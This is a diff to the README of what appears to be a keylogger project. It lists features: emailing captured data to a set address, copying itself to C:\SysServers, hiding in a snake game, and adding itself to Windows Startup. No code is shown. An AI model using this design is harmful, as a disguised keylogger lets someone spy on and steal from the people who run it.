@@ -6,6 +6,7 @@
 - Packaged and collected information sent to a specified email address
 - It will copy itself to the C:drive (C:\SysServers)
 - Disguised as a snake game, it will run the backup keylogger after "GAMEOVER" (Yeah, also for the user)
+  - Game come from https://github.com/rajatdiptabiswas/snake-pygame
 - Add the backup keylogger to Windows Startup, so it will run automatically at startup in Windows
 - There is a Backdoor, Press "F12" to terminate the program, otherwise you need to go to the task manager to terminate the "system.exe"
 ### **Usage**
